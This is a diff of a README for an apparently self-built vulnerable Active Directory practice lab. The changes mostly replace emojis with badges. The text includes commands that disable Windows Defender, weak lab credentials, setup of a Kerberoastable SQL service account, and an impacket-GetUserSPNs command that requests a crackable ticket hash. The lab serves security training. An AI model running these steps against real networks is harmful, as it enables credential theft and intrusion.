@@ -1,10 +1,11 @@
-# 🔥 Vulnerable Active Directory Lab
+# ![Status](https://img.shields.io/badge/Status-Vulnerable-red) Vulnerable Active Directory Lab
+
 
 Welcome to the Vulnerable Active Directory Lab! This lab is designed to help you practice common Active Directory attack techniques in a safe, controlled environment.
 
 ---
 
-## 🧪 Lab Setup — Script Execution Order
+## ![Section](https://img.shields.io/badge/Section-Lab%20Setup-informational) Lab Setup — Script Execution Order
 
 Run the following PowerShell scripts **in this exact order** to build the vulnerable AD environment:
 
@@ -17,7 +18,7 @@ Run the following PowerShell scripts **in this exact order** to build the vulner
 
 
 ---
-## ⚪ Whitebox / Assumed Breach Scenario
+## ![Scenario](https://img.shields.io/badge/Scenario-Whitebox-lightgrey)  Whitebox / Assumed Breach Scenario
 
 In this lab, we assume a **whitebox** or **assumed breach** scenario where some credentials are already publicly known or leaked.
 
@@ -27,12 +28,12 @@ In this lab, we assume a **whitebox** or **assumed breach** scenario where some 
 |----------|--------------|
 | charlie  | Password@123 |
 
-> 🔐 **Note:**  
+> ![Note](https://img.shields.io/badge/Note-Intentional%20Exposure-yellow)   
 > The credential for user **charlie** is intentionally made public in this lab to simulate a real-world scenario where attackers have access to leaked or weak credentials. Use this credential to practice lateral movement, privilege escalation, and other attack techniques.
 
 ## After Follow this steps
 
-###  ▶️  Run this command to off defender
+###  ![Phase](https://img.shields.io/badge/Phase-Post%20Setup-informational)   Run this command to off defender
 
 #### Disable Real-Time Monitoring
         Set-MpPreference -DisableRealtimeMonitoring $true
@@ -47,7 +48,7 @@ In this lab, we assume a **whitebox** or **assumed breach** scenario where some 
         Set-MpPreference -MAPSReporting 0
         Set-MpPreference -SubmitSamplesConsent 2
 
-## 🔐 Add Users to Remote Management Users Group
+## ![Access](https://img.shields.io/badge/Access-Remote%20Management-blue) Add Users to Remote Management Users Group
 
 Run the following commands in an **elevated Command Prompt** (Run as Administrator) on the target machine to add users `harry`, `peter`, and `sqlsvc` to the **Remote Management Users** local group:
 
@@ -59,11 +60,11 @@ Run the following commands in an **elevated Command Prompt** (Run as Administrat
 
 
 
-### 🛠️ Step 1 — Create the sqlsvc User in Active Directory
+###  Step 1 — Create the sqlsvc User in Active Directory
 
 #### Follow the steps below to create a dedicated SQL service account in Active Directory.
 
-##### ✔️ Create the SQL Service Account (sqlsvc)
+#####  Create the SQL Service Account (sqlsvc)
 
 ##### Open Server Manager
 #### → Navigate to Tools
@@ -99,9 +100,9 @@ Run the following commands in an **elevated Command Prompt** (Run as Administrat
             
         Password: Password@123
         
-#### ✔️ Password never expires
+####  Password never expires
 
-#### ❌ User must change password at next logon (leave unchecked)
+####  User must change password at next logon (leave unchecked)
 
 #### Click Finish to create the user.
 
@@ -109,14 +110,14 @@ Run the following commands in an **elevated Command Prompt** (Run as Administrat
 <img width="680" height="454" alt="image" src="https://github.com/user-attachments/assets/f6cd50f9-083f-466a-83ba-64d4b4ff7bf7" />
 <br>
 
-### 🔥 STEP 2 — Assign the SPN to sqlsvc
+###  STEP 2 — Assign the SPN to sqlsvc
 
 After creating the service account, assign the SQL Server SPN using setspn.
 
-### ▶️ Command
+###  Command
     setspn -A MSSQLSvc/Infosec.sandeep.local:1433 sqlsvc
 
-✅ Expected Output
+ Expected Output
 Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local
 
 <img width="652" height="92" alt="image" src="https://github.com/user-attachments/assets/746788bc-6807-4e6a-bbb2-a064815d74a7" />
@@ -126,24 +127,24 @@ Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local
 
 Run the following command to confirm the SPN is properly registered:
 
-### ▶️ Command
+### Command
     setspn -L sqlsvc
 
-✅ Expected Output
+ Expected Output
 MSSQLSvc/Infosec.sandeep.local:1433
 
 <img width="660" height="91" alt="image" src="https://github.com/user-attachments/assets/78ce35e2-a542-4371-abdf-8ee4a7db0dde" />
 
 <br>
 
-### 🧑‍💻 STEP 4 — Request the TGS Using Impacket (Kali Linux)
+###  STEP 4 — Request the TGS Using Impacket (Kali Linux)
 
 Now run GetUserSPNs to obtain the Kerberos TGS ticket hash.
 
-### ▶️ Command
+###  Command
 impacket-GetUserSPNs sandeep.local/emma:'Password@123' -dc-ip 192.168.29.193 -request
 
-🟢 Expected Result
+ Expected Result
 
 You will now receive a TGS hash:
 
@@ -198,7 +199,7 @@ $krb5tgs$23$sqlsvc$SANDEEP.LOCAL...
      harry - iamvery@close129129
 
 
-# 🛠️ Manual GUI Guide: Grant **SeImpersonatePrivilege** to User **harry**
+# ![Privilege](https://img.shields.io/badge/Privilege-SeImpersonatePrivilege-red) Manual GUI Guide: Grant **SeImpersonatePrivilege** to User **harry**
 
 ---
 
